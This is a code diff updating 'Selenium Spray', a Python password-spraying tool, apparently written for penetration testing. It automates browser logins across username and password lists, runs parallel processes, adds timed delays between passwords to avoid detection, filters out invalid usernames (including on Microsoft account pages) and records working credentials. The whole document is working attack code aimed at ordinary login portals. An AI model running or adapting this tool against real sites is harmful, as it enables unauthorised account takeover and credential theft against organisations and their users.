@@ -7,8 +7,9 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support import expected_conditions as ec
 from selenium.webdriver.support.ui import WebDriverWait
 from datetime import datetime, timedelta
-from multiprocessing import Pool
-from functools import partial
+from selenium.common.exceptions import TimeoutException
+from concurrent.futures import ProcessPoolExecutor
+import multiprocessing
 import pause
 
 # --------------------------------- #
@@ -16,7 +17,7 @@ import pause
 # --------------------------------- #
 
 valid_credentials = []
-__version__ = "0.1"
+__version__ = "0.2"
 
 
 # --------------------------------- #
@@ -40,68 +41,81 @@ class Colors:
 # --------------------------------- #
 
 def main(usernames="", passwords="", domain="", domain_after=False, url="", username_field="", password_field="",
-         checkbox="", fail="", success="", threads=5, delay=30):
-
+         checkbox="", fail="", success="", threads=5, delay=30, invalid_username=""):
     # Prepare variables
     fail, success = prepare_success_fail(fail=fail, success=success)
     usernames = process_file(usernames)
     passwords = process_file(passwords)
     usernames = prepare_usernames(usernames, domain, domain_after)
     url = prepare_url(url)
+    invalid_username = prepare_invalid_username(invalid_username=invalid_username)
     (username_field_key, username_field_value, password_field_key, password_field_value, checkbox_key,
      checkbox_value) = prepare_fields(username_field, password_field, checkbox=checkbox)
     print_beginning(usernames=usernames, passwords=passwords, domain=domain, domain_after=domain_after, url=url,
-                    fail=fail, success=success, threads=threads, delay=delay)
+                    fail=fail, success=success, threads=threads, delay=delay, username_field=username_field,
+                    password_field=password_field, invalid_username=invalid_username)
 
     # Loop through passwords
-    i = 0
-    while i < len(passwords):
-        next_start_time = datetime.now() + timedelta(minutes=delay)
-        additional_arguments = {
-            'password': passwords[i],
-            'url': url,
-            'username_field_key': username_field_key,
-            'username_field_value': username_field_value,
-            'password_field_key': password_field_key,
-            'password_field_value': password_field_value,
-            'checkbox_key': checkbox_key,
-            'checkbox_value': checkbox_value,
-            'fail': fail,
-            'success': success
-        }
+    password_id = 0
+    while password_id < len(passwords):
+        next_start_time = datetime.now() + timedelta(minutes=delay)  # Check when the next spray should run
 
-        # Create a partial function with fixed additional arguments
-        partial_attempt_login = partial(attempt_login, **additional_arguments)
+        print(f"Beginning spray with password '{passwords[password_id]}'")
 
-        # Split the list of usernames into chunks for parallel processing
-        if len(usernames) < threads:
-            chunk_size = len(usernames)
-        else:
-            chunk_size = len(usernames) // threads
-        username_chunks = [usernames[i:i + chunk_size] for i in range(0, len(usernames), chunk_size)]
+        # Spin up processes for each login attempt. Threads could have also been utilized, but Selenium is cleaner with
+        # individual processes.
+        manager = multiprocessing.Manager()
+        queue = manager.Queue()
+        with ProcessPoolExecutor(max_workers=threads) as executor:
+            for username in usernames:
+                processes = executor.submit(attempt_login,
+                                            queue=queue,
+                                            username=username,
+                                            password=passwords[password_id],
+                                            url=url,
+                                            username_field_key=username_field_key,
+                                            username_field_value=username_field_value,
+                                            password_field_key=password_field_key,
+                                            password_field_value=password_field_value,
+                                            checkbox_key=checkbox_key,
+                                            checkbox_value=checkbox_value,
+                                            fail=fail,
+                                            success=success,
+                                            invalid_username=invalid_username)
+            processes.result()
 
-        print(f"Starting spray of password '{passwords[i]}'")
-        # Create a pool of worker processes
-        with Pool(processes=threads) as pool:
-            # Run the attempt_login_wrapper function in parallel with each chunk of usernames
-            pool.map(partial(attempt_login_wrapper, partial_attempt_login), username_chunks)
+        usernames = process_queue(queue=queue, usernames=usernames)  # Retrieve results from the queue
 
         # Check to see if the process is at the end. If not, wait the specified time.
-        i += 1
-        if i < len(passwords):
-            print(f"Spray of password '{passwords[(i-1)]}' complete. Waiting until {next_start_time.strftime('%H:%M')} "
-                  f"to start next spray.")
+        password_id += 1
+        if password_id < len(passwords):
+            print(f"Spray of password '{passwords[(password_id - 1)]}' complete. Waiting until "
+                  f"{next_start_time.strftime('%H:%M')} to start next spray.")
             pause.until(next_start_time)
         else:
-            print(f"Spray of password '{passwords[i-1]}' complete. All passwords complete.")
+            print(f"Spray of password '{passwords[password_id - 1]}' complete. All passwords complete.")
 
     print_ending()
 
 
-def print_beginning(usernames=None, passwords=None, domain="", domain_after=False, url="",
-                    fail="", success="", threads=5, delay=30):
+def process_queue(queue=None, usernames=None):
+    if queue.empty():
+        return
+
+    global valid_credentials
+    while not queue.empty():
+        user = queue.get()
+        usernames.remove(user["USERNAME"])
+        if user["VALID"]:
+            valid_credentials.append({"USERNAME": user["USERNAME"], "PASSWORD": user["PASSWORD"]})
+
+    return usernames
+
+
+def print_beginning(usernames=None, passwords=None, domain="", domain_after=False, url="", invalid_username=None,
+                    fail="", success="", threads=5, delay=30, username_field="", password_field=""):
     # Calculate length of spray
-    total_minutes = len(passwords)*delay
+    total_minutes = len(passwords) * delay
     days = total_minutes // (24 * 60)
     hours = (total_minutes % (24 * 60)) // 60
     minutes = total_minutes % 60
@@ -111,22 +125,25 @@ def print_beginning(usernames=None, passwords=None, domain="", domain_after=Fals
         spray_duration = "{:02d} {:02d}:{:02d}".format(days, hours, minutes)
 
     print(f"{Colors.HEADER}{Colors.BOLD}Selneium Spray{Colors.END}")
-    print(f"Author: Luke Lauterbach (Sentinel Technologies)")
+    print(f"Author:  Luke Lauterbach (Sentinel Technologies)")
     print(f"Version: {__version__}\n")
 
     print(f"{'Username Count:':<28}{len(usernames)}")
     print(f"{'Password Count:':<28}{len(passwords)}")
-    print(f"{'Total Login Attempts:':<28}{(len(usernames)*len(passwords))}")
+    print(f"{'Total Login Attempts:':<28}{(len(usernames) * len(passwords))}")
     print(f"{'Approximate Spray Duration:':<28}{spray_duration}")
     print(f"{'URL:':<28}{url}")
     if domain and domain_after:
         print(f"{'Domain:':<28}@{domain}")
     elif domain and not domain_after:
         print(f"{'Domain:':<28}{domain}/")
+    print(f"{'Username Field:':<28}{username_field}")
+    print(f"{'Password Field:':<28}{password_field}")
     if success:
-        print(f"{'Success Condition:':<28}@{success}")
+        print(f"{'Success Condition:':<28}{success}")
     elif fail:
         print(f"{'Failure Condition:':<28}{fail}")
+    print(f"{'Invalid Username Condition:':<28}{invalid_username}")
     print(f"{'Threads:':<28}{threads}")
     print(f"{'Delay:':<28}{delay}\n")
 
@@ -144,47 +161,55 @@ def print_ending():
 
 def parse_arguments():
     parser = argparse.ArgumentParser(description="Performs a password spraying attack utilizing Selenium.")
-    parser.add_argument("-d", "--domain",
-                        help="(OPTIONAL) Username or file with list of usernames to spray.")
-    parser.add_argument("-da", "--domain-after", action="store_true",
-                        help="(OPTIONAL) Append domain to the end of the username (e.g. username@domain). By default,"
-                             "the domain is placed before the username (e.g. domain/username).")
-    parser.add_argument("-p", "--password", required=True,
-                        help="(REQUIRED) Password or file with list of usernames to spray.")
-    parser.add_argument('-f', '--fail',
-                        help="(OPTIONAL) Text which will be on the page if authentication fails. -s can be used as an"
-                             "alternative.")
-    parser.add_argument('-s', '--success',
-                        help="(OPTIONAL) Text which will be on the page if authentication is successful. -f can be "
-                             "used as an alternative")
-    parser.add_argument("-u", "--username", required=True,
-                        help="(REQUIRED) Username or file with list of usernames to spray.")
-    parser.add_argument('URL',
-                        help="(REQUIRED) URL of the website to spray.")
+    required = parser.add_argument_group("Required")
+    condition = parser.add_argument_group("Condition for Successful Login (One Required)")
+    optional = parser.add_argument_group("Optional")
 
-    parser.add_argument('-uf', '--username-field', required=True, type=str,
-                        help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
-                             "a username into. Can be found by inspecting the username field in your browser. For"
-                             "example, if '<input type='email'>', enter 'type='email''")
-    parser.add_argument('-pf', '--password-field', required=True, type=str,
-                        help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
-                             "a username into. Can be found by inspecting the username field in your browser. For"
-                             "example, if '<input type='email'>', enter 'type='email''")
-    parser.add_argument('-cb', '--checkbox', type=str,
-                        help="(OPTIONAL) If a checkbox is required, provide a unique attribute of the checkbox, "
-                             "allowing the script to automatically check it. For example, if '<input type='checkbox'>',"
-                             " enter 'type='checkbox''")
+    required.add_argument('URL',
+                          help="(REQUIRED) URL of the website to spray.")
+    optional.add_argument("-d", "--domain",
+                          help="(OPTIONAL) Username or file with list of usernames to spray.")
+    optional.add_argument("-da", "--domain-after", action="store_true",
+                          help="(OPTIONAL) Append domain to the end of the username (e.g. username@domain). By default,"
+                               "the domain is placed before the username (e.g. domain/username).")
+    required.add_argument("-p", "--password", required=True,
+                          help="(REQUIRED) Password or file with list of usernames to spray.")
+    condition.add_argument('-f', '--fail',
+                           help="(OPTIONAL) Text which will be on the page if authentication fails. -s can be used as "
+                                "an alternative.")
+    condition.add_argument('-s', '--success',
+                           help="(OPTIONAL) Text which will be on the page if authentication is successful. -f can be "
+                                "used as an alternative")
+    required.add_argument("-u", "--username", required=True,
+                          help="(REQUIRED) Username or file with list of usernames to spray.")
+    optional.add_argument("-i", "--invalid-username", type=str,
+                          help="(OPTIONAL) String(s) to look for to determine if the username was invalid. Multiple "
+                               "strings can be provided comma seperated with no spaces.")
 
-    parser.add_argument('-t', '--threads', type=int, default=5,
-                        help="(OPTIONAL) Number of threads for passwords spraying. Lower is stealthier. Default is 5.")
-    parser.add_argument('-dl', '--delay', type=int, default=30,
-                        help="(OPTIONAL) Length of time between passwords. The delay is between the first spray attempt"
-                             " with a password and the first attempt with the next password. Default is 30.")
+    required.add_argument('-uf', '--username-field', required=True, type=str,
+                          help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
+                               "a username into. Can be found by inspecting the username field in your browser. For"
+                               "example, if '<input type='email'>', enter 'type='email''")
+    required.add_argument('-pf', '--password-field', required=True, type=str,
+                          help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
+                               "a username into. Can be found by inspecting the username field in your browser. For"
+                               "example, if '<input type='email'>', enter 'type='email''")
+    optional.add_argument('-cb', '--checkbox', type=str,
+                          help="(OPTIONAL) If a checkbox is required, provide a unique attribute of the checkbox, "
+                               "allowing the script to automatically check it. For example, if "
+                               "'<input type='checkbox'>', enter 'type='checkbox''")
+
+    optional.add_argument('-t', '--threads', type=int, default=5,
+                          help="(OPTIONAL) Number of threads for passwords spraying. Lower is stealthier. "
+                               "Default is 5.")
+    optional.add_argument('-dl', '--delay', type=int, default=30,
+                          help="(OPTIONAL) Length of time between passwords. The delay is between the first spray "
+                               "attempt with a password and the first attempt with the next password. Default is 30.")
 
     args = parser.parse_args()  # Parse the command-line arguments
-
     return (args.username, args.password, args.domain, args.domain_after, args.URL, args.username_field,
-            args.password_field, args.checkbox, args.fail, args.success, args.threads, args.delay)
+            args.password_field, args.checkbox, args.fail, args.success, args.threads, args.delay,
+            args.invalid_username)
 
 
 def import_txt_file(filename):
@@ -248,7 +273,7 @@ def prepare_url(url=""):
 
 
 def prepare_fields(username_field="", password_field="", checkbox=""):
-    username_field = username_field.replace("'", ""). replace('"', "")  # Remove quotation marks
+    username_field = username_field.replace("'", "").replace('"', "")  # Remove quotation marks
     password_field = password_field.replace("'", "").replace('"', "")  # Remove quotation marks
 
     username_field = username_field.split("=")
@@ -271,101 +296,113 @@ def prepare_fields(username_field="", password_field="", checkbox=""):
             checkbox_value)
 
 
-def attempt_login_wrapper(attempt_login_func, username):
-    # This is a wrapper function to pass the additional arguments to attempt_login
-    attempt_login_func(username)
+def prepare_invalid_username(invalid_username=None):
+    final_list = ["couldn't find an account with that username", "this username may be incorrect"]
+    if invalid_username:
+        invalid_username = invalid_username.split(",")
+        final_list.extend(invalid_username)
+    return final_list
 
 
-def attempt_login(usernames=None, password="", url="", username_field_key="", username_field_value="",
+def list_in_string(string_to_check="", list_to_compare=None):
+    if not list_to_compare:
+        return False
+    for comparison_string in list_to_compare:
+        if comparison_string in string_to_check:
+            return True
+    return False
+
+
+def attempt_login(username=None, password="", url="", username_field_key="", username_field_value="",
                   password_field_key="", password_field_value="", checkbox_key="", checkbox_value="", fail=None,
-                  success=None):
-    for username in usernames:
-        selenium_options = webdriver.ChromeOptions()
-        selenium_options.add_argument('--ignore-certificate-errors')
-        driver = webdriver.Chrome(options=selenium_options)
-        driver.delete_all_cookies()
-        driver.get(url)
+                  success=None, queue=None, invalid_username=None):
+    selenium_options = webdriver.ChromeOptions()
+    selenium_options.add_argument('--ignore-certificate-errors')
+    driver = webdriver.Chrome(options=selenium_options)
+    driver.delete_all_cookies()
+    driver.get(url)
 
-        # Wait until the username box loads
+    # Wait until the username box loads
+    try:
+        WebDriverWait(driver, 5).until(
+            ec.element_to_be_clickable((By.XPATH, f"//input[@{username_field_key}='{username_field_value}']")))
+    except:
+        print(f"ERROR - Could not find the username field with key {username_field_key} and value "
+              f"{username_field_value}")
+        driver.close()
+        return
+
+    # Find the username box
+    input_box = driver.find_element(By.XPATH, f"//input[@{username_field_key}='{username_field_value}']")
+    input_box.clear()  # Clear any existing text in the input box
+    input_box.send_keys(username)
+
+    # Try to find the password box. If it isn't on the current page, hit the ENTER key and wait for the Password
+    # field to load.
+    try:
+        WebDriverWait(driver, 1).until(
+            ec.element_to_be_clickable((By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")))
+    except TimeoutException:
+        input_box.send_keys(Keys.RETURN)
+        sleep(1)  # Wait for the page to load
+        if "Microsoft" and "Work or school account" in driver.page_source:
+            work_box = driver.find_element(By.XPATH, f"//div[@id='aadTile']")
+            work_box.click()
+            sleep(1)
+
+    if list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=invalid_username):
+        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - USERNAME INVALID: {username}")
+        queue.put({"USERNAME": username, "PASSWORD": password, "VALID": False})
+        driver.close()
+        return
+
+    try:
+        WebDriverWait(driver, 3).until(
+            ec.element_to_be_clickable((By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")))
+    except:
+        print(f"ERROR - Could not find the password field with key '{password_field_key}' and value "
+              f"'{password_field_value}'")
+        driver.close()
+        return
+
+    password_box = driver.find_element(By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")
+    password_box.clear()
+    password_box.send_keys(password)
+    # If there's a checkbox, click it.
+    if checkbox_key and checkbox_value:
         try:
-            WebDriverWait(driver, 5).until(
-                ec.element_to_be_clickable((By.XPATH, f"//input[@{username_field_key}='{username_field_value}']")))
+            checkbox = driver.find_element(By.XPATH, f"//input[@{checkbox_key}='{checkbox_value}']")
+            checkbox.click()
         except:
-            print(f"ERROR - Could not find the username field with key {username_field_key} and value "
-                  f"{username_field_value}")
-            return
+            print(f"ERROR - Could not find the password field with key {password_field_key} and value "
+                  f"{password_field_value}")
 
-        # Find the username box
-        input_box = driver.find_element(By.XPATH, f"//input[@{username_field_key}='{username_field_value}']")
-        input_box.clear()  # Clear any existing text in the input box
-        input_box.send_keys(username)
+    password_box.send_keys(Keys.RETURN)
 
-        # Try to find the password box. If it isn't on the current page, hit the ENTER key and wait for the Password
-        # field to load.
-        try:
-            WebDriverWait(driver, 1).until(
-                ec.element_to_be_clickable((By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")))
-        except:
-            input_box.send_keys(Keys.RETURN)
-            sleep(1)  # Wait for the page to load
-            if "Microsoft" and "Work or school account" in driver.page_source:
-                work_box = driver.find_element(By.XPATH, f"//div[@id='aadTile']")
-                work_box.click()
-                sleep(1)
+    # Check to see if the login was successful
+    sleep(2)
+    result = False
+    for conditional_statement in (fail + success):
+        if conditional_statement in driver.page_source:
+            result = True
 
-            if ("couldn't find an account with that username" in driver.page_source.lower() or
-                    "this username may be incorrect" in driver.page_source.lower()):
-                print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - USERNAME INVALID: {username}")
-                continue
+    if result and success:
+        result = "SUCCESS"
+    elif not result and fail:
+        result = "SUCCESS"
+    elif result and fail:
+        result = "INVALID"
+    elif not result and success:
+        result = "INVALID"
 
-        try:
-            WebDriverWait(driver, 3).until(
-                ec.element_to_be_clickable((By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")))
-        except:
-            print(f"ERROR - Could not find the password field with key '{password_field_key}' and value "
-                  f"'{password_field_value}'")
-            driver.close()
-            continue
+    if result == "SUCCESS":
+        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}SUCCESS{Colors.END}: {username} - "
+              f"{password}")
+        queue.put({"USERNAME": username, "PASSWORD": password, "VALID": True})
+    else:
+        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - INVALID: {username} - {password}")
 
-        password_box = driver.find_element(By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")
-        password_box.clear()
-        password_box.send_keys(password)
-        # If there's a checkbox, click it.
-        if checkbox_key and checkbox_value:
-            try:
-                checkbox = driver.find_element(By.XPATH, f"//input[@{checkbox_key}='{checkbox_value}']")
-                checkbox.click()
-            except:
-                print(f"ERROR - Could not find the password field with key {password_field_key} and value "
-                      f"{password_field_value}")
-
-        password_box.send_keys(Keys.RETURN)
-
-        # Check to see if the login was successful
-        sleep(2)
-        result = False
-        for conditional_statement in (fail + success):
-            if conditional_statement in driver.page_source:
-                result = True
-
-        if result and success:
-            result = "SUCCESS"
-        elif not result and fail:
-            result = "SUCCESS"
-        elif result and fail:
-            result = "INVALID"
-        elif not result and success:
-            result = "INVALID"
-
-        if result == "SUCCESS":
-            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}SUCCESS{Colors.END}: {username} - "
-                  f"{password}")
-            global valid_credentials
-            valid_credentials.append({"USERNAME": username, "PASSWORD": password})
-        else:
-            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - INVALID: {username} - {password}")
-
-        driver.quit()
+    driver.quit()
 
 
 # --------------------------------- #
@@ -374,7 +411,12 @@ def attempt_login(usernames=None, password="", url="", username_field_key="", us
 
 if __name__ == "__main__":
     (main_usernames, main_passwords, main_domain, main_domain_after, main_url, main_username_field, main_password_field,
-     main_checkbox, main_fail, main_success, main_threads, main_delay) = parse_arguments()
-    main(usernames=main_usernames, passwords=main_passwords, domain=main_domain, domain_after=main_domain_after,
-         url=main_url, username_field=main_username_field, password_field=main_password_field, checkbox=main_checkbox,
-         fail=main_fail, success=main_success, threads=main_threads, delay=main_delay)
+     main_checkbox, main_fail, main_success, main_threads, main_delay, main_invalid_username) = parse_arguments()
+    try:
+        main(usernames=main_usernames, passwords=main_passwords, domain=main_domain, domain_after=main_domain_after,
+             url=main_url, username_field=main_username_field, password_field=main_password_field,
+             checkbox=main_checkbox, fail=main_fail, success=main_success, threads=main_threads, delay=main_delay,
+             invalid_username=main_invalid_username)
+    except KeyboardInterrupt:
+        print("\nCtrl+C Detected")
+        print_ending()
